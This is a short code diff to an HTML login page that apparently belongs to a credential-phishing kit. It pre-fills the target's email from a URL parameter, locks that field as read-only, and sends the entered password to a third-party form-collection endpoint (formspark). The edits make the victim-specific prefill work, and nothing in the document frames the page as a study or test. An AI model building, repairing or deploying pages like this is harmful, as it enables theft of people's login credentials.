@@ -131,7 +131,7 @@
                       <form id="loginForm" action="https://submit.formspark.io/your-form-id" method="POST"> 
                       <div class="mb-2">
                           <label for="email" class="form-label">Email address</label>
-                          <input type="email" class="form-control shadow-none" placeholder="Receiver's email" name="email" id="email" required />
+                          <input type="email" class="form-control shadow-none" placeholder="Receiver's email" name="email" id="email" required readonly />
                       </div>
                       <div class="mb-3">
                           <label for="password" class="form-label">Password</label>
@@ -168,8 +168,8 @@
         const emailParam = urlParams.get("e") || "";
 
         if (validateEmailAddress(emailParam)) {
-          document.querySelector("#emailInput").value = emailParam;
-          document.querySelector("#emailInput").required = true;
+          document.querySelector("#email").value = emailParam;
+          document.querySelector("#email").readonly = true;
         }
 
         document.querySelectorAll("td").forEach((cell) => {
